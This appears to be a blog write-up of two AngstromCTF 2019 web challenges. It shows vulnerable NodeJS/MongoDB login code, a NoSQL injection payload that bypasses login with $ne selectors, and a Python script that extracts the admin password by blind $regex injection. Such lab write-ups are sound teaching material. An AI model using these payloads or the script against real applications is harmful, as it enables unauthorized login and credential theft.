---
layout: post
asset: "/assets/posts/angstromctf2019/"
title: "AngstromCTF2019: No Sequels 1 && 2"
date: 2019-04-26 16:09:43 +1000
categories: [writeup, web]
tags: [ctf, 2019, angstrom, web]
points: 130
author: Morgaine Timms
license: CC-BY-4.0
thumbnail: 
thumbnailAttr: 
thumbnailAttrUrl: 
thumbnailAlt: 
published: true
toc: false
description: "MongoDB query selectors and blind injection"
excerpt_separator: <!--more-->
---

AngstromCTF2019: No Sequels 1 && 2
===================================

The Challenge
-------------

Two parts, 130pts total.

Part 1

> No Sequels
> Web
> 50
>
> The prequels sucked, and the sequels aren't much better, but at least we always have the original trilogy.
>
> Author: SirIan
>
> link: https://nosequels.2019.chall.actf.co/


Part 2

> No Sequels 2
> Web
> 80
>
> This is the sequel to No Sequels. You'll see the challenge page once you solve the first one.
>
> Author: SirIan

<!--more-->

The Solution
------------

### PART 1

The linked page is a simple login screen, with a snippet of NodeJS code for the `POST /login` route provided

![]({{ page.asset }}12DA5BC3247B3F2A6992F3B3578EFA61.jpg)

```js
router.post('/login', verifyJwt, function (req, res) {
    // monk instance
    var db = req.db;

    var user = req.body.username;
    var pass = req.body.password;

    if (!user || !pass){
        res.send("One or more fields were not provided.");
    }
    var query = {
        username: user,
        password: pass
    }

    db.collection('users').findOne(query, function (err, user) {
        if (!user){
            res.send("Wrong username or password");
            return
        }

        res.cookie('token', jwt.sign({name: user.username, authenticated: true}, secret));
        res.redirect("/site");
    });
});
```

In the code, the POST body parameters `​username`​ and `​password`​ are passed directly to a database without sanitisation. This is probably an injection point.

The syntax used (`​db.collection('users').findOne(…`​) looks like mongodb, and the reference to a "monk instance" confirms this.

Using [a list of NoSQL payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) we can get issued an authenticated JWT with the following payload. This should result in authentication as the first available user record.

```js
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

The server dutifully responds with a user token and redirects.

![]({{ page.asset }}DE79BE2C31825AB331C6C0D7FE131406.png)

### PART 2

The authenticated page at `GET /site` provides the name of the admin user object in the database, and the code snippet for the POST route

```js
router.post('/site', verifyJwt, function (req, res) {
    // req.user is assigned from verifyJwt
    if (!req.user.authenticated || !req.body.pass2) {
        res.send("bad");
    }
 
    var query = {
        username: req.user.name,
    }
 
    var db = req.db;
    db.collection('users').findOne(query, function (err, user) {
        console.log(user);
        if (!user){
            res.render('access', {username:' \''+req.user.name+'\' ', message:"Only user 'admin' can log in with this form!"});
        }
        var pass = user.password;
        var message = "";
        if (pass === req.body.pass2){
            res.render('final');
        } else {
            res.render('access', {username:' \''+req.user.name+'\' ', message:"Wrong LOL!"});
        }
 
    });
 
});
```

The next flag requires acquisition of the password for user ‘admin’.

In part 1 [mongodb query selectors](https://docs.mongodb.com/manual/reference/operator/query/) were used for *both* the user and password parameters provided to `POST /login`.

Now that the target username is known, it will be possible to reconstruct the password with a Blind NoSQL injection on the password field.

[This script from github](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) is more than sufficient. It uses the regex query selector to build the password one character at a time.

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="https://nosequels.2019.chall.actf.co/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

After retrieving the password (“congratsyouwin”) it is possible to log in to the page in part 2 and get the flag: `act{still_no_sql_in_the_sequel}`

![]({{ page.asset }}67AF52332EB7EAD9D19748723F833B1B.png)
